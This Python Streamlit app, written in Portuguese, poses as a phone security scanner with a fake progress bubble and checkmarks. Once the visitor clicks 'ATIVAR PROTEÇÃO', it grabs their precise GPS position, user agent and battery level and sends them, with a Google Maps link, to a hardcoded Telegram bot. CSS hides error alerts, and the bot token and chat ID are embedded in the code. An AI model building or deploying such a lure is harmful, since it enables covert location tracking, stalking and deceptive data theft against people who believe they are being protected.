import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# 2. CSS DA BOLHA E LIMPEZA DE AVISOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { display: none !important; }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    
    /* BOTÃO ESTILIZADO */
    .btn-ativar {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 60px; border-radius: 10px; border: none;
        font-size: 18px; cursor: pointer; margin-top: 20px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE HARDWARE (MODELO E BATERIA)
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Estado inicial da bolha
if 'porcentagem' not in st.session_state:
    st.session_state['porcentagem'] = 4

with caixa_bolha.container():
    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["porcentagem"]}%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. O SEGREDO: COMPONENTE HTML/JS PARA DISPARAR O POP-UP SEM ERRO
# Isso contorna o erro de sintaxe e o bloqueio do navegador
if 'gps_data' not in st.session_state:
    st.session_state['gps_data'] = None

# Script JS que roda ao clicar no botão
componente_js = """
<script>
function getGeo() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const data = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                ok: true
            };
            window.parent.postMessage({type: 'streamlit:set_component_value', value: data}, '*');
        },
        (err) => { alert("Por favor, ative a localização no seu GPS!"); },
        {enableHighAccuracy: true}
    );
}
</script>
<button class="btn-ativar" onclick="getGeo()">🔴 ATIVAR PROTEÇÃO</button>
"""

# Renderiza o botão via HTML/JS para garantir o pop-up
resultado_gps = st.components.v1.html(componente_js, height=100)

# 6. LÓGICA DE ENVIO E ANIMAÇÃO
if resultado_gps and 'lat' in resultado_gps:
    # 1. Animação 0-100%
    for p in range(0, 101, 10):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    
    # 2. Dados finais
    lat = resultado_gps['lat']
    lon = resultado_gps['lon']
    mapa = f"https://www.google.com/maps?q={lat},{lon}"
    
    relatorio = (
        f"🛡️ SISTEMA ATIVADO\n\n"
        f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
        f"🔋 Bateria: {bateria if bateria else '--'}%\n"
        f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
    )
    
    enviar_telegram(relatorio)
    st.success("Localização concluída")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
